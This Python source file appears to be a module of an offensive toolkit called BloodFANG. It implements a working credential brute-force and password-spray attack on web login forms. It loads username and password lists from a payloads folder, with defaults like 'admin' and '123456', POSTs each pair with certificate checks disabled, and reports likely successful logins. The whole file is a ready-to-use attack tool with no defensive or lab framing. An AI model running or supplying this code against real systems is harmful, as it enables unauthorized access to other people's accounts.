# fangbrute.py
"""
Brute force / credential spray:
 - password_spray(base, users, pwds, path, emit, stop_event=None)
 - run(target, emit, stop_event=None)  # target = "BASE::/path"
"""
import requests
import time
import os
from pathlib import Path

def _find_payload_dir():
    here = Path(__file__).resolve().parent
    cand = here / "payloads"
    if cand.exists(): return cand
    cur = here
    for _ in range(6):
        p = cur / "payloads"
        if p.exists(): return p
        p2 = cur / "BloodFANG" / "core" / "payloads"
        if p2.exists(): return p2
        cur = cur.parent
    env = os.getenv("BLOODFANG_PAYLOADS")
    if env:
        p = Path(env)
        if p.exists(): return p
    return cand

PAYLOAD_DIR = _find_payload_dir()

def _load_payloads(name, fallback):
    try:
        f = PAYLOAD_DIR / name
        if f.exists():
            text = f.read_text(encoding="utf-8", errors="ignore")
            lines = [L.strip() for L in text.splitlines() if L.strip() and not L.strip().startswith("#")]
            if lines: return lines
    except Exception:
        pass
    return fallback

USERS = _load_payloads("brute_usernames.txt", ["admin", "user", "test"])
PWDS  = _load_payloads("brute_passwords.txt", ["password", "123456", "admin123"])

def password_spray(base, users, pwds, path, emit, stop_event=None):
    if not base:
        emit("[BRUTE] Missing base URL.")
        return
    if not path:
        emit("[BRUTE] Missing path.")
        return
    if not path.startswith("/"):
        path = "/" + path
    target = base.rstrip("/") + path
    emit(f"[BRUTE] Target: {target}")
    for u in users:
        for p in pwds:
            if stop_event is not None and getattr(stop_event, "is_set", lambda: False)():
                emit("[BRUTE] Stopped by user.")
                return
            data = {"username": u, "password": p}
            try:
                r = requests.post(target, data=data, timeout=8, verify=False, allow_redirects=True)
                emit(f"[BRUTE] {r.status_code} {u}:{p}")
                low = r.text.lower() if r.text else ""
                if all(k not in low for k in ("invalid", "incorrect", "error", "failed")):
                    emit(f"[BRUTE] Possible success {u}:{p}")
            except requests.exceptions.RequestException as re:
                emit(f"[BRUTE] Request error: {re}")
            except Exception as e:
                emit(f"[BRUTE] Unexpected error: {e}")
            time.sleep(0.3)
    emit("[BRUTE] Completed.")

def run(target, emit, stop_event=None):
    base, path = (target.split("::", 1) + [""])[:2]
    password_spray(base, USERS, PWDS, path, emit, stop_event)
